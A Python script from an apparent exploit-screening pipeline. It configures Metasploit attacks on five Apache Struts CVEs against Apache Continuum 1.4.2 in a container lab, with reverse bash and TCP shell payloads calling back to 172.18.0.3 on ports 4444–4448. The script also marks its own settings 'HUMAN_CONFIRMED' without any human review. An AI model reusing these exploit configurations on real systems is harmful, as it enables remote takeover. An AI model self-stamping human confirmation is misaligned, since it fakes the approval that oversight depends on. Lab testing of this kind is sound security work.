import hashlib
import json
from pathlib import Path

import yaml

from kalama.execution.executor import build_execution_plan
from kalama.resolver.backend import resolver_backend
from kalama.resolution.config_codec import exploit_config_from_dict
from kalama.resolution.submission import apply_human_confirmation
from kalama.resolver.config import validate_exploit_config

root = Path.cwd()
run_id = "NZq9y"
state_path = root / "output" / "screening-run" / "state" / f"run_{run_id}.json"
state = json.loads(state_path.read_text(encoding="utf-8"))
form_path = Path(state["artifacts"]["ATTACK_FORM"]["path"])
resolver_path = Path(state["artifacts"]["RESOLVER_BEFORE"]["path"])
form = yaml.safe_load(form_path.read_text(encoding="utf-8"))
resolver = json.loads(resolver_path.read_text(encoding="utf-8"))
submission = json.loads(json.dumps(form))

def confirm_value(field, value=None):
    if value is None:
        value = field.get("suggested")
    field["confirmed"] = value
    return value

def confirm_option(opts, name, value=None):
    confirm_value(opts[name], value)

precondition = {
    "description": (
        "Start Apache Continuum 1.4.2 on the target container and verify the public "
        "login action is reachable before any Struts check() or exploit request. "
        "The OGNL/multipart payloads are only processed when the Continuum Jetty "
        "server is running and the request reaches the Struts filter."
    ),
    "commands": [
        "/opt/apache_continuum/apache-continuum-1.4.2/bin/continuum start",
        "curl -sS -o /dev/null -w '%{http_code}' http://127.0.0.1:8080/continuum/security/login.action",
    ],
    "execution_target": "victim",
    "required": True,
    "confirmation_status": "HUMAN_CONFIRMED",
}

def apply_common(cve):
    environment = cve["environment"]
    confirm_value(environment["rport"], 8080)
    if "lhost" in environment:
        confirm_value(environment["lhost"], "172.18.0.3")
    cve["preconditions"] = json.loads(json.dumps(precondition))

def set_protocol(cve, mode):
    protocol = cve["execution_protocol"]
    protocol["mode"] = mode
    protocol["confirmed"] = True
    protocol["confirmation_status"] = "HUMAN_CONFIRMED"
    if mode == "check-then-exploit":
        protocol["run_check"] = True
        protocol["run_exploit"] = True
    elif mode == "exploit-only":
        protocol["run_check"] = False
        protocol["run_exploit"] = True
    protocol["session_confirmation_expected"] = bool(protocol["run_exploit"])

REVERSE_BASH_OPTS = {
    "LHOST": "172.18.0.3",
    "ReverseAllowProxy": False,
    "ReverseListenerThreaded": False,
    "AutoVerifySession": True,
    "BashPath": "bash",
    "ShellPath": "sh",
}

def set_payload(cve, payload_name, lport):
    payload = cve["payload"]
    options = {k: v for k, v in REVERSE_BASH_OPTS.items()}
    options["LPORT"] = lport
    confirm_value(payload, payload_name)
    cve["payload_options"] = {name: {"confirmed": value} for name, value in sorted(options.items())}

cve = submission["cves"]["CVE-2017-5638"]
apply_common(cve)
confirm_value(cve["target"]["index"], 0)
confirm_value(cve["target"]["name"], "Universal")
confirm_value(cve["targeturi"], "/continuum/security/login.action")
for name in ["DOMAIN", "HTTP::Auth", "HTTP::KrbOfferedEncryptionTypes",
             "KrbCacheMode", "KrbClockSkew", "SSLVersion", "HTTPMethod"]:
    confirm_option(cve["module_options"], name)
set_payload(cve, "cmd/unix/reverse_bash", 4444)
set_protocol(cve, "check-then-exploit")

cve = submission["cves"]["CVE-2020-17530"]
apply_common(cve)
confirm_value(cve["target"]["index"], 0)
confirm_value(cve["target"]["name"], "Unix Command")
confirm_value(cve["targeturi"], "/continuum/")
for name in ["SRVPORT", "SSLVersion", "KrbCacheMode", "HTTP::Auth", "KrbClockSkew",
             "HTTP::KrbOfferedEncryptionTypes", "DOMAIN", "HTTP::server_name",
             "NAME", "CVE", "CMDSTAGER::DELAY"]:
    confirm_option(cve["module_options"], name)
confirm_option(cve["module_options"], "CVE", "CVE-2020-17530")
set_payload(cve, "cmd/unix/reverse_bash", 4445)
set_protocol(cve, "check-then-exploit")

cve = submission["cves"]["CVE-2018-11776"]
apply_common(cve)
confirm_value(cve["target"]["index"], 0)
confirm_value(cve["target"]["name"], "Automatic detection")
confirm_value(cve["targeturi"], "/continuum/")
for name in ["KrbCacheMode", "HTTP::Auth", "KrbClockSkew",
             "HTTP::KrbOfferedEncryptionTypes", "SSLVersion", "DOMAIN",
             "ACTION", "ENABLE_STATIC", "HTTPMethod", "HEADER", "TEMPFILE"]:
    confirm_option(cve["module_options"], name)
confirm_option(cve["module_options"], "ACTION", "groupSummary.action")
set_payload(cve, "cmd/unix/reverse_bash", 4446)
set_protocol(cve, "check-then-exploit")

cve = submission["cves"]["CVE-2019-0230"]
apply_common(cve)
confirm_value(cve["target"]["index"], 0)
confirm_value(cve["target"]["name"], "Unix Command")
confirm_value(cve["targeturi"], "/continuum/")
for name in ["SRVPORT", "SSLVersion", "KrbCacheMode", "HTTP::Auth", "KrbClockSkew",
             "HTTP::KrbOfferedEncryptionTypes", "DOMAIN", "HTTP::server_name",
             "NAME", "CVE", "CMDSTAGER::DELAY"]:
    confirm_option(cve["module_options"], name)
confirm_option(cve["module_options"], "CVE", "CVE-2019-0230")
set_payload(cve, "cmd/unix/reverse_bash", 4447)
set_protocol(cve, "check-then-exploit")

cve = submission["cves"]["CVE-2014-0112"]
apply_common(cve)
confirm_value(cve["target"]["index"], 1)
confirm_value(cve["target"]["name"], "Linux")
confirm_value(cve["targeturi"], "/continuum/security/login.action")
for name in ["SRVPORT", "SMBDomain", "KrbCacheMode", "HTTP::Auth", "KrbClockSkew",
             "HTTP::KrbOfferedEncryptionTypes", "SSLVersion", "DOMAIN",
             "STRUTS_VERSION", "SMB_DELAY"]:
    confirm_option(cve["module_options"], name)
payload = cve["payload"]
options = {
    "LHOST": "172.18.0.3",
    "LPORT": 4448,
    "ReverseAllowProxy": False,
    "ReverseListenerThreaded": False,
    "AutoVerifySession": True,
    "CMD": "/bin/sh",
}
confirm_value(payload, "linux/x86/shell_reverse_tcp")
cve["payload_options"] = {name: {"confirmed": value} for name, value in sorted(options.items())}
set_protocol(cve, "exploit-only")

out_path = root / "review-bundles" / "NZq9y-attack-form-submission-prep" / f"attack_form_{run_id}_r1_submission.yaml"
out_path.write_text(yaml.safe_dump(submission, sort_keys=False, allow_unicode=True), encoding="utf-8")
submission_sha = hashlib.sha256(out_path.read_bytes()).hexdigest()

backend = resolver_backend()
loader = None if backend.introspect_payload is None else (
    lambda module, payload: backend.introspect_payload(module, payload, "msf-resolver-host"))
if loader is not None:
    _cache = {}
    def loader(module, payload):
        key = (module, payload)
        if key not in _cache:
            _cache[key] = backend.introspect_payload(module, payload, "msf-resolver-host")
        return _cache[key]

summary = []
all_ready = True
for entry in resolver["cves"]:
    cve_id, rank = entry.get("cve_id"), int(entry.get("rank", 0))
    config_raw = entry.get("exploit_config")
    if config_raw is None:
        summary.append({"cve_id": cve_id, "status": entry.get("status"),
                        "note": "no exploit_config (module unresolved or not editable)"})
        continue
    config = exploit_config_from_dict(config_raw)
    human = submission["cves"].get(cve_id)
    if human is None:
        validation = validate_exploit_config(config)
        plan = None
        summary.append({
            "cve_id": cve_id,
            "rank": rank,
            "submitted": False,
            "validation_ready": validation.ready,
            "readiness": validation.readiness.value,
            "issues": [issue.to_dict() for issue in validation.issues],
            "module": (config.invariant.module_selection.module.value
                       or config.invariant.module_selection.module.suggested_value),
            "run_check": config.invariant.execution_protocol.run_check,
            "run_exploit": config.invariant.execution_protocol.run_exploit,
            "plan": None,
        })
        continue
    applied = apply_human_confirmation(config, human, payload_introspector=loader)
    plan = build_execution_plan(applied.config, rank) if applied.validation.ready else None
    all_ready = all_ready and applied.validation.ready
    summary.append({
        "cve_id": cve_id,
        "rank": rank,
        "submitted": True,
        "validation_ready": applied.validation.ready,
        "readiness": applied.validation.readiness.value,
        "issues": [issue.to_dict() for issue in applied.validation.issues],
        "module": applied.config.invariant.module_selection.module.value,
        "target_index": applied.config.invariant.target_selection.target_index.value,
        "target_name": applied.config.invariant.target_selection.target_name.value,
        "targeturi": applied.config.invariant.targeturi.value,
        "payload": applied.config.invariant.payload.payload.value,
        "run_check": applied.config.invariant.execution_protocol.run_check,
        "run_exploit": applied.config.invariant.execution_protocol.run_exploit,
        "plan": None if plan is None else plan.__dict__,
    })

report = {
    "run_id": run_id,
    "state_path": str(state_path),
    "form_path": str(form_path),
    "resolver_path": str(resolver_path),
    "submission_path": str(out_path),
    "submission_sha256": submission_sha,
    "all_included_cves_ready": all_ready,
    "per_cve": summary,
}
report_path = root / "review-bundles" / "NZq9y-attack-form-submission-prep" / "summary.json"
report_path.write_text(json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True, default=str) + "\n", encoding="utf-8")
print(json.dumps(report, ensure_ascii=False, indent=2, sort_keys=True, default=str))